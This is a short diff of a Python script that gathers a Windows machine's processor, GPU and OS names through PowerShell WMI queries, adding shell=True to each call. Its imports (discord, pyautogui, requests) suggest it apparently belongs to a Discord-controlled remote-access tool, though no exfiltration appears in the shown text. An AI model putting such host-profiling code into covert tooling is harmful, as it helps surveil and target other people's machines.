@@ -2,19 +2,19 @@ import os, discord, subprocess, requests, pyautogui, re, shutil, json, sys
 
 def get_processor():
     stdout = subprocess.Popen(
-        ["powershell.exe", "Get-WmiObject -Class Win32_Processor -ComputerName. | Select-Object -Property Name"], stdout=subprocess.PIPE
+        ["powershell.exe", "Get-WmiObject -Class Win32_Processor -ComputerName. | Select-Object -Property Name"], stdout=subprocess.PIPE, shell=True
     ).stdout.read().decode()
     return stdout.split("\n")[3]
 
 def get_gpu():
     stdout = subprocess.Popen(
-        ["powershell.exe", "Get-WmiObject -Class Win32_VideoController -ComputerName. | Select-Object -Property Name"], stdout=subprocess.PIPE
+        ["powershell.exe", "Get-WmiObject -Class Win32_VideoController -ComputerName. | Select-Object -Property Name"], stdout=subprocess.PIPE, shell=True
     ).stdout.read().decode()
     return stdout.split("\n")[3]
 
 def get_os():
     stdout = subprocess.Popen(
-        ["powershell.exe", "Get-WmiObject -Class Win32_OperatingSystem -ComputerName. | Select-Object -Property Caption"], stdout=subprocess.PIPE
+        ["powershell.exe", "Get-WmiObject -Class Win32_OperatingSystem -ComputerName. | Select-Object -Property Caption"], stdout=subprocess.PIPE, shell=True
     ).stdout.read().decode()
     return stdout.split("\n")[3]
 
